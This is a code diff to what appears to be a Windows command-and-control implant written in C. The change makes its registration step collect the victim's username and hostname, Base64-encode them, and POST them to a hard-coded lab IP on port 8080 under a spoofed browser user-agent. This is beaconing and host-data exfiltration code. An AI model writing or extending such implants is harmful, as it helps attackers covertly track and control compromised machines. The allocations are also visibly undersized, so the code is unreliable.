@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <stdio.h>
 #include <wininet.h>
+#include <wincrypt.h>
 
 // Socket globals
 
@@ -67,20 +68,29 @@ void Registration() {
 }
 
 void Init() {
-    Agent.Address = "192.168.227.130";
+    Agent.Address = "192.168.142.128";
     Agent.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 ";
     Agent.Port = 8080;
     Agent.Path = "/";   
 
-    // CHAR *data = "username=%s";
-    CHAR *post = (CHAR*)malloc(strlen(Register.Username));
-    sprintf(post, Register.Username);
+    // Define data format
+    char *format = "%s\n%s";
 
-    DWORD post_buffer_length = strlen(post) + 5;
-    CHAR *post_buffer = (CHAR*)calloc(strlen(post) + 5, sizeof(CHAR));
+    // Allocate data to encode
+    char *data_to_encode = malloc(strlen(Register.Username) + strlen(Register.Hostname));
+    sprintf(data_to_encode, format, Register.Username, Register.Hostname);
 
-    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", post);
+    // Encode data to be encoded
+    char *encode_data = malloc(strlen(data_to_encode) * 2);
+    DWORD encode_data_len = strlen(data_to_encode) * 2;
+    CryptBinaryToString(data_to_encode, strlen(data_to_encode), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encode_data, &encode_data_len);
 
+    // Create buffer to be sent
+    DWORD post_buffer_length = strlen(encode_data) + 5;
+    CHAR *post_buffer = (CHAR*)calloc(strlen(encode_data) + 5, sizeof(CHAR));
+    sprintf_s(post_buffer, post_buffer_length, "%s\r\n\r\n", encode_data);
+
+    // Create buffer to allocate space in headers
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
@@ -100,6 +110,6 @@ void Init() {
 
 
 int main() {
-    Registration();
+    Registration();    
     Init();
 }
